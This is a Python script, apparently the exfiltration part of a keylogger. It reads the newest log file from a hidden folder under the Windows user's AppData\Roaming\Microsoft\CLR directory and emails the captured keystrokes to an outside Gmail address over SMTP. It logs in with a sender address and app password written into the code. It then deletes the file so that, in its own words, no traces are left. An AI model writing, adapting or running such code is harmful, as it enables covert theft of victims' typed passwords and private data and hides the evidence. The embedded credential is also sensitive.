import smtplib, os, glob
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

file_data = ""
#Find home directory
home_dir = str(os.path.expanduser('~'))
print("Home directory " + home_dir)
#Go to the folder directory
dir1 = home_dir.replace("'\'", "'\\'")#Replace single slash with double slash
path = dir1 + "\\AppData\\Roaming\\Microsoft\\CLR"
os.chdir(path)#Enter the directory
#Find the newest file in the folder
dir2 = home_dir.replace("'\'", "'/'")
file_dir = dir2 + '/AppData/Roaming/Microsoft/CLR/*'
file_list = glob.glob(file_dir)
newest_file = max(file_list, key=os.path.getctime)
print("Newest file in directory " + newest_file)
#Open file
with open(newest_file, 'r') as f:
  #Loop through each line of the file
  for line in (line.strip('\n') for line in f):
    file_data += line

content = "Here are the latest recordings from keylogger.\n" + file_data

#The mail addresses and password
sender_email = 'yeah4sureee@gmail.com'
sender_pass = 'fxwkfrtpnbvtozhm'
receiver_email = 'slabysh2015@gmail.com'
#Setup the MIME
message = MIMEMultipart()
message['From'] = sender_email
message['To'] = receiver_email
message['Subject'] = 'Keylogger'   #The subject line
#The body and the attachments for the mail
message.attach(MIMEText(content, 'plain'))
#Create SMTP session for sending the mail
server = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
server.starttls() #enable security
server.login(sender_email, sender_pass) #login with mail_id and password
text = message.as_string()
server.sendmail(sender_email, receiver_email, text)
server.quit()
print('Mail Sent')
os.remove(newest_file)#Delete sent file
print("Deleted sent file. No traces left")